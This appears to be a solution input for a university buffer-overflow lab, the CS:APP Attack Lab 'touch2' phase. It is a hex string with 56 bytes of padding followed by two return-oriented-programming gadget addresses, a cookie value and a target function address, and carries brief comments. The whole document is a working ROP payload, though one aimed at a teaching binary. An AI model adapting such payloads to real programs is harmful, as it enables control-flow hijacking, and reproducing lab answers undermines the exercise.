00 00 00 00 00 00 00 00 /* all padding to 56 (our buffer) */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* end of buffer */
b8 19 40 00 00 00 00 00 /* gadget 1 */
30 51 c1 40 00 00 00 00 /* cookie */
9b 19 40 00 00 00 00 00 /* gadget 2 */
3b 18 40 00 00 00 00 00 /* address of touch2 */
